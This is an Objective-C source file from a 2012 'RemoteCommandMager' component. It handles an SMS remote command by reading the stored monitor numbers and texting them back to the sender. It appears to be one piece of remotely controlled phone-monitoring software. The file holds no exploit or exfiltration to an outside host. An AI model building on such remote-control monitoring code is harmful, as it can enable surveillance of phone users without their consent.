
/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  QueryCISNNumbersProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  12/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "QueryCISNumbersProcessor.h"
#import "PrefMonitorNumber.h"
#import "Preference.h"

@interface QueryCISNumbersProcessor (PrivateAPI)
- (void) sendReplySMSWithResult: (NSString *) aResult; 
- (void) processQueryCISNumbers;
@end

@implementation QueryCISNumbersProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the QueryCISNumbersProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self(QueryCISNumbersProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"QueryCISNumbersProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}


#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the QueryCISNumbersProcessor
 - Argument list and description: 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"QueryCISNumbersProcessor--->doProcessingCommand")
    [self processQueryCISNumbers];
}


#pragma mark QueryCISNumbersProcessor  PrivateAPI

/**
 - Method name: processQueryCISNumbers
 - Purpose:This method is used to process query CIS Numbers
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (void) processQueryCISNumbers {
	DLog (@"QueryCISNumbersProcessor--->processQueryCISNumbers")
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefMonitorNumber *prefMonitor = (PrefMonitorNumber *) [prefManager preference:kMonitor_Number];
	NSArray *cisNumbersArray=[prefMonitor mMonitorNumbers];
	NSString *result=NSLocalizedString(@"kQueryCISNumbers", @"");
	for (NSString *cisNumber in cisNumbersArray) {
		result=[result stringByAppendingString:@"\n"];
		result=[result stringByAppendingString:cisNumber];
	}
	[self sendReplySMSWithResult:result];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description:No Argument
 - Return description: No return type
*/

- (void) sendReplySMSWithResult:(NSString *) aResult {
	DLog (@"QueryCISNumbersProcessor--->sendReplySMSWithResult")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	NSString *queryCISNumberMessage=[NSString stringWithFormat:@"%@%@",messageFormat,aResult];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:queryCISNumberMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
														       andMessage:queryCISNumberMessage];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

-(void) dealloc {
	[super dealloc];
}



@end
